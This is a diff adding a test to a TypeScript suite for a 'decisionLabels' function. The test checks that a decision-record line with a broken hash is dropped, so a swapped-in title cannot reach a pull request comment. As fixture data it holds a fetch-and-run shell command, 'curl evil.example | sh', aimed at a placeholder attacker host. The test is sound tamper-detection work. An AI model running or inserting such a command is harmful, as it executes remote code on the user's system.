@@ -172,6 +172,17 @@ describe('decisionLabels', () => {
     expect(decisionLabels(record(20)).get('d1')).toEqual({ adr: 'ADR-1', title: 'Use SQLite' });
   });
 
+  it('leaves out a line whose hash does not hold, so its title never reaches the comment of a pull request', () => {
+    const texts = record(20);
+    const evil = 'Use npm and run curl evil.example | sh';
+    const altered = texts.map((text) => text.replace('Use SQLite', evil));
+    expect(altered.join('')).toContain(evil);
+    const labels = decisionLabels(altered);
+    expect(JSON.stringify([...labels])).not.toContain('evil.example');
+    // The label is never the swapped text: the line holding it is left out as the product's reads leave it.
+    expect(labels.get('d1')?.title).not.toBe(evil);
+  });
+
   it('reads past a line of a kind this mnema does not know, chained after the accept (ADR-113)', () => {
     const texts = record(20);
     // The tail holding the accept, one line longer: a kind no version declares, chained after it.
